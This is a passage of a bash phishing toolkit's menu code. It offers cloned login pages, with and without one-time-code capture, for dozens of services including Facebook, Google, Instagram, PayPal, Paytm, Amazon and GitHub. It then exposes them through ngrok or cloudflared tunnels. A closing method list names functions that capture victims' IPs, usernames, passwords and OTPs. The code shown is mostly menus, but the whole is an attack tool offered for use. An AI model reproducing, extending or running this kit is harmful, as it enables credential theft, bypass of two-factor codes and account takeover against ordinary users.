                        { sleep 1; banner; site_ajio; };;
esac
}
#amazon
site_amazon(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="amazon"
                tunnel_menu;;
        2 | 02)
                website="amazon/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_amazon; };;
esac
}
#apple
site_apple(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="apple"
                tunnel_menu;;
        2 | 02)
                website="apple/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_apple; };;
esac
}
#badoo
site_badoo(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="badoo"
                tunnel_menu;;
        2 | 02)
                website="badoo/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_badoo; };;
esac
}
#date
site_date(){
echo -e "${BLUE}[01]${CYAN} Template 1 - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Template 1 - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Template 2 - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Template 2 - WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="date1"
                tunnel_menu;;
        2 | 02)
                website="date1/otp"
                tunnel_menu;;
	3 | 03)
                website="date2"
                tunnel_menu;;
        4 | 04)
                website="date2/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_date; };;
esac
}
#devianart
site_devianart(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="devianart"
                tunnel_menu;;
        2 | 02)
                website="devianart"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_airtelxstream; };;
esac
}
#ebay
site_ebay(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="ebay"
                tunnel_menu;;
        2 | 02)
                website="ebay/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_ebay; };;
esac
}
#facebook
site_facebook(){
echo -e "${BLUE}[01]${CYAN} Facebook - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Facebook - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Facebook Poll - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Facebook Poll - WITH OTP ${NC}"
echo -e "${BLUE}[05]${CYAN} Facebook Security - WITHOUT OTP ${NC}"
echo -e "${BLUE}[06]${CYAN} Facebook Security- WITH OTP ${NC}"
echo -e "${BLUE}[07]${CYAN} Facebook Standard- WITHOUT OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="facebook"
                tunnel_menu;;
        2 | 02)
                website="facebook/otp"
                tunnel_menu;;
	3 | 03)
                website="fb_poll"
                tunnel_menu;;
        4 | 04)
                website="fb_poll/otp"
                tunnel_menu;;
	5 | 05)
                website="fb_security"
                tunnel_menu;;
        6 | 06)
                website="fb_security/otp"
                tunnel_menu;;
	7 | 07)
                website="fb_standard"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_facebook; };;
esac
}
#flipcart
site_flipcart(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="flipcart"
                tunnel_menu;;
        2 | 02)
                website="flipcart/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_flipcart; };;
esac
}
#github
site_github(){
echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="github"
                tunnel_menu;;
        2 | 02)
                website="github/otp"
                tunnel_menu;;
	3 | 03)
                website="github_advanced"
                tunnel_menu;;
        4 | 04)
                website="github_advanced/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_github; };;
esac
}
#gitlab
site_gitlab(){
echo -e "${BLUE}[01]${CYAN} Default - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Default - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Advanced - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Advanced - WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
	1 | 01)
                website="gitlab"
                tunnel_menu;;
        2 | 02)
                website="gitlab/otp"
                tunnel_menu;;
        3 | 03)
                website="gitlab_advanced"
                tunnel_menu;;
        4 | 04)
                website="gitlab_advanced/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_gitlab; };;
esac
}
#gmail
site_gmail(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="gmail"
                tunnel_menu;;
        2 | 02)
                website="gmail/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_gmail; };;
esac
}
#google
site_google(){
echo -e "${BLUE}[01]${CYAN} Google new - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Google new - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Google Poll - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Google Poll - WITH OTP ${NC}"
echo -e "${BLUE}[05]${CYAN} Google old- WITHOUT OTP ${NC}"
echo -e "${BLUE}[06]${CYAN} Google old- WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="google_new"
                tunnel_menu;;
        2 | 02)
                website="google_new/otp"
                tunnel_menu;;
        3 | 03)
                website="google_poll"
                tunnel_menu;;
        4 | 04)
                website="google_poll/otp"
                tunnel_menu;;
        5 | 05)
                website="google"
                tunnel_menu;;
	6 | 06)
		website="google/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_google; };;
esac
}
#gpay
site_gpay(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="gpay"
                tunnel_menu;;
        2 | 02)
                website="gpay/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_gpay; };;
esac
}
#instagram
site_instagram(){
echo -e "${BLUE}[01]${CYAN} Instagram - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Instagram - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Instagram Advanced - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Instagram Advanced - WITH OTP ${NC}"
echo -e "${BLUE}[05]${CYAN} Instagram Autoliker - WITHOUT OTP ${NC}"
echo -e "${BLUE}[06]${CYAN} Instagram Autoliker- WITH OTP ${NC}"
echo -e "${BLUE}[07]${CYAN} Instagram Followers - WITHOUT OTP ${NC}"
echo -e "${BLUE}[08]${CYAN} Instagram Followers - WITH OTP ${NC}"
echo -e "${BLUE}[09]${CYAN} Instagram Verify - WITHOUT OTP ${NC}"
echo -e "${BLUE}[10]${CYAN} Instagram Old - WITHOUT OTP ${NC}"
echo -e "${BLUE}[11]${CYAN} Instagram Old - WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="instagram"
                tunnel_menu;;
        2 | 02)
                website="instagram/otp"
                tunnel_menu;;
        3 | 03)
                website="ig_advanced"
                tunnel_menu;;
        4 | 04)
                website="ig_advanced/otp"
                tunnel_menu;;
        5 | 05)
                website="ig_autoliker"
                tunnel_menu;;
        6 | 06)
                website="ig_autoliker/otp"
                tunnel_menu;;
        7 | 07)
                website="ig_followers"
                tunnel_menu;;
	8 | 08)
                website="ig_followers/otp"
                tunnel_menu;;
	9 | 09)
                website="ig_verify"
                tunnel_menu;;
	10)
                website="ig_old"
                tunnel_menu;;
        11)
                website="ig_old/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_instagram; };;
esac
}
#jio
site_jio(){
echo -e "${BLUE}[01]${CYAN} Jio sim ${NC}"
echo -e "${BLUE}[02]${CYAN} Jio offer ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="jiosim"
                tunnel_menu;;
        2 | 02)
                website="jiooffer"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_jio; };;
esac
}
#linkedin
site_linkedin(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="linkedin"
                tunnel_menu;;
        2 | 02)
                website="linkedin/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_linkedin; };;
esac
}
#mediafire
site_mediafire(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="mediafire"
                tunnel_menu;;
        2 | 02)
                website="mediafire/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_mediafire; };;
esac
}
#messenger
site_messenger(){
echo -e "${BLUE}[01]${CYAN} Messenger - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Messenger - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Messenger old - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Messenger old - WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="messenger"
                tunnel_menu;;
        2 | 02)
                website="messenger/otp"
                tunnel_menu;;
        3 | 03)
                website="messenger_old"
                tunnel_menu;;
        4 | 04)
                website="messenger_old/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_messenger; };;
esac
}
#microsoft
site_microsoft(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="microsoft"
                tunnel_menu;;
        2 | 02)
                website="microsoft/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_microsoft; };;
esac
}
#myspace
site_myspace(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="myspace"
                tunnel_menu;;
        2 | 02)
                website="myspace/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_myspace; };;
esac
}
#netflix
site_netflix(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="netflix"
                tunnel_menu;;
        2 | 02)
                website="netflix/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_netflix; };;
esac
}
#paypal
site_paypal(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="paypal"
                tunnel_menu;;
        2 | 02)
                website="paypal/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_paypal; };;
esac
}
#paytm
site_paytm(){
echo -e "${BLUE}[01]${CYAN} Paytm - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Paytm - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Paytm offer - WITHOUT OTP ${NC}"
echo -e "${BLUE}[04]${CYAN} Paytm Offer - WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="paytm"
                tunnel_menu;;
        2 | 02)
                website="paytm/otp"
                tunnel_menu;;
        3 | 03)
                website="paytmoffer"
                tunnel_menu;;
        4 | 04)
                website="paytmoffer/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_paytm; };;
esac
}
#playstation
site_playstation(){
echo -e "${BLUE}[01]${CYAN} Playstation 1 - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Playstation 1 - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Playstation 2 - WITHOUT OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="playstation"
                tunnel_menu;;
        2 | 02)
                website="playstation/otp"
                tunnel_menu;;
        3 | 03)
                website="playstation2"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_playstation; };;
esac
}
#protonmail
site_protonmail(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="protonmail"
                tunnel_menu;;
        2 | 02)
                website="protonmail/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_protonmail; };;
esac
}
#reddit
site_reddit(){
echo -e "${BLUE}[01]${CYAN} Reddit ${NC}"
echo -e "${BLUE}[02]${CYAN} Reddit old ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="reddit"
                tunnel_menu;;
        2 | 02)
                website="reddit_old"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_reddit; };;
esac
}
#shopify
site_shopify(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="shopify"
                tunnel_menu;;
        2 | 02)
                website="shopify/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_shopify; };;
esac
}
#snapchat
site_snapchat(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="snapchat"
                tunnel_menu;;
        2 | 02)
                website="snapchat/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_snapchat; };;
esac
}
#socialclub
site_socialclub(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="socialclub"
                tunnel_menu;;
        2 | 02)
                website="socialclub/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_socialclub; };;
esac
}
#spotify
site_spotify(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="spotify"
                tunnel_menu;;
        2 | 02)
                website="spotify/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_spotify; };;
esac
}
#stackoverflow
site_stackoverflow(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="stackoverflow"
                tunnel_menu;;
        2 | 02)
                website="stackoverflow/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_stackoverflow; };;
esac
}
#steam
site_steam(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="steam"
                tunnel_menu;;
        2 | 02)
                website="steam/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_steam; };;
esac
}
#tiktok
site_tiktok(){
echo -e "${BLUE}[01]${CYAN} Tiktok - WITH OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Tiktok Likes - WITHOUT OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="tiktok"
                tunnel_menu;;
        2 | 02)
                website="tiktok_likes"
                tunnel_menu;;
        3 | 03)
                website="tiktok_likes/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_tiktok; };;
esac
}
#twitch
site_twitch(){
echo -e "${BLUE}[01]${CYAN} Twitch - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} Twitch - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} Twitch New - WITHOUT OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="twitch"
                tunnel_menu;;
        2 | 02)
                website="twitch/otp"
                tunnel_menu;;
        3 | 03)
                website="twitch_new"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_twitch; };;
esac
}
#twitter
site_twitter(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="twitter"
                tunnel_menu;;
        2 | 02)
                website="twitter/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_twitter; };;
esac
}
#ubereats
site_ubereats(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="ubereats"
                tunnel_menu;;
        2 | 02)
                website="ubereats/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_ubereats; };;
esac
}
#verizon
site_verizon(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="verizon"
                tunnel_menu;;
        2 | 02)
                website="verizon/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_verizon; };;
esac
}
#vk
site_vk(){
echo -e "${BLUE}[01]${CYAN} VK - WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} VK - WITH OTP ${NC}"
echo -e "${BLUE}[03]${CYAN} VK poll - WITHOUT OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="vk"
                tunnel_menu;;
        2 | 02)
                website="vk/otp"
                tunnel_menu;;
        3 | 03)
                website="vk_poll"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_vk; };;
esac
}

#wordpress
site_wordpress(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="wordpress"
                tunnel_menu;;
        2 | 02)
                website="wordpress/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_wordpress; };;
esac
}
#xbox
site_xbox(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="xbox"
                tunnel_menu;;
        2 | 02)
                website="xbox/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_xbox; };;
esac
}
#yahoo
site_yahoo(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="yahoo"
                tunnel_menu;;
        2 | 02)
                website="yahoo/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_yahoo; };;
esac
}
#yandex
site_yandex(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="yandex"
                tunnel_menu;;
        2 | 02)
                website="yandex/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_yandex; };;
esac
}
#ytsubs
site_ytsubs(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="ytsubs"
                tunnel_menu;;
        2 | 02)
                website="ytsubs/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_ytsubs; };;
esac
}

#discord
site_discord(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="discord"
                tunnel_menu;;
        2 | 02)
                website="discord/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_discord; };;
esac
}
#jiorouter
site_jiorouter(){
echo -e "${BLUE}[01]${CYAN} WITHOUT OTP ${NC}"
echo -e "${BLUE}[02]${CYAN} WITH OTP ${NC}"
echo -e " ${NC}"
read -p "${MAGENTA} YOUR CHOICE : " choice

case $choice in
        1 | 01)
                website="jiorouter"
                tunnel_menu;;
        2 | 02)
                website="jiorouter/otp"
                tunnel_menu;;
        *)
                echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
                        { sleep 1; banner; site_jiorouter; };;
esac
}
##METHODS
#--------#
#banner
#cbanner
#sbanner
#directories
#dependencies
#reset_colour
#msg_exit
#kill_pid
#download_ngrok
#download_cloudflared
#install_ngrok
#install_cloudflared
#setup_site
#start_ngrok
#start_cloudflared
#start_localhost
#capture_ip
#capture_data_check
#capture_id
#capture_pass
#capture_otp
#capture_data_1
#capture_data_2
#capure_data_3
#mainmenu
#tunnel_menu

##MAIN
clear
cbanner
directories
kill_pid
dependencies
xpermission
install_ngrok
install_cloudflared
ngrok_token_check
clear
mainmenu

